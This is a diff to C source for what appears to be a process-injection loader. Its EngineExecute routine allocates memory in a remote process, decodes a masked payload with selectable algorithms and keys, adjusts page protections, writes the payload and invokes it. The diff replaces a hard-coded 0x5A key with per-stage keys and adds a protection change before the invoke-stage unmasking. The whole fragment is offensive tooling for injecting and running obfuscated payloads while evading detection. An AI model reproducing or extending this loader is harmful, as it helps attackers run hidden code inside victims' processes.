@@ -7,6 +7,8 @@
 #include "hash_loader.h"
 #include "hashed_values.h"
 
+#include "maskit.h"
+
 #include "unwindraven_integration.h"
 
 #include <stdio.h>
@@ -695,16 +697,11 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
         printf("[+] Space allocated RW at: 0x%p\n", ctx->pRemoteAddress);
     }
 
-    printf("[DEBUG] unmaskForWrite = %s\n", ctx->unmaskForWrite ? "TRUE" : "FALSE");
+    printf("[TEST] unmaskForWrite = %s\n", ctx->unmaskForWrite ? "TRUE" : "FALSE");
     if(ctx->unmaskForWrite) {
-        uint8_t key = 0x5A;              /* default */
+        uint8_t key = ctx->unmaskWriteKey;
         //printf("[DEBUG] Lookup on algo: %s\n", ctx->unmaskInvokeAlgo);
         mask_algo_t *algo = mask_find(ctx->unmaskWriteAlgo);
-
-        /*printf("[DEBUG] Buffer=%p\n", ctx->pRemoteAddress);
-        printf("[DEBUG] Size=%zu\n", ctx->payloadSize);
-        printf("[DEBUG] Algo=%p\n", (void*)algo);
-        printf("[DEBUG] Key=%02X\n", key);    */
         
         if (!algo) {
             printf("[ERROR] Unknown algorithm: %s\n",
@@ -720,9 +717,12 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
             .algo   = algo
         };
 
+        /*printf("Using algorithm: %s\n", ctx->unmaskWriteAlgo);
+        printf("Key: 0x%02X\n", key);*/
+
         __try
         {
-            printf("[DEBUG] Running unmask_execute\n");
+            printf("[DEBUG] Running pre-write unmask_execute\n");
             unmask_execute(&entry);
             printf("[DEBUG] Unmask complete\n");
         }
@@ -731,7 +731,6 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
             DWORD code = GetExceptionCode();
             printf("[UNMASK EXCEPTION] 0x%08X\n", code);
         }
-        printf("[DEBUG] Unmask complete\n");
     }
 
     if (IsPayloadPE(pPayload)) {
@@ -742,17 +741,14 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
         engine->Write(ctx, pPayload);
     }
 
-    printf("[DEBUG] unmaskForInvoke = %s\n", ctx->unmaskForInvoke ? "TRUE" : "FALSE");
+    DWORD oldProt = 0;
+
+    printf("[TEST] unmaskForInvoke = %s\n", ctx->unmaskForInvoke ? "TRUE" : "FALSE");
     if(ctx->unmaskForInvoke) {
-        uint8_t key = 0x5A;              /* default */
+        uint8_t key = ctx->unmaskInvokeKey;        
         //printf("[DEBUG] Lookup on algo: %s\n", ctx->unmaskInvokeAlgo);
         mask_algo_t *algo = mask_find(ctx->unmaskInvokeAlgo);
 
-        /*printf("[DEBUG] Buffer=%p\n", ctx->pRemoteAddress);
-        printf("[DEBUG] Size=%zu\n", ctx->payloadSize);
-        printf("[DEBUG] Algo=%p\n", (void*)algo);
-        printf("[DEBUG] Key=%02X\n", key);    */
-        
         if (!algo) {
             printf("[ERROR] Unknown algorithm: %s\n",
             ctx->unmaskInvokeAlgo);
@@ -765,10 +761,19 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
             .ctx    = &key,
             .algo   = algo
         };
+        
+        /*printf("Using algorithm: %s\n", ctx->unmaskWriteAlgo);
+        printf("Key: 0x%02X\n", key);*/
 
         __try
         {
-            printf("[DEBUG] Running unmask_execute\n");
+            printf("[+] Adjusting permissions.\n");
+            if (!engine->Protect(ctx, PAGE_READWRITE, &oldProt)) {
+                printf("[-] Failed to adjust page protection! Error: 0x%lx\n", GetLastError());
+                return 1; // or handle failure
+            }
+
+            printf("[DEBUG] Running pre-invoke unmask_execute\n");
             unmask_execute(&entry);
             printf("[DEBUG] Unmask complete\n");
         }
@@ -777,11 +782,10 @@ BOOL EngineExecute(PINJECTION_ENGINE engine,
             DWORD code = GetExceptionCode();
             printf("[UNMASK EXCEPTION] 0x%08X\n", code);
         }
-        printf("[DEBUG] Unmask complete\n");
     }
 
     printf("[+] Adjusting permissions.\n");
-    DWORD oldProt = 0;
+    oldProt = 0;
     engine->Protect(ctx, finalProtect, &oldProt);
 
     printf("[+] Invoking payload.\n");
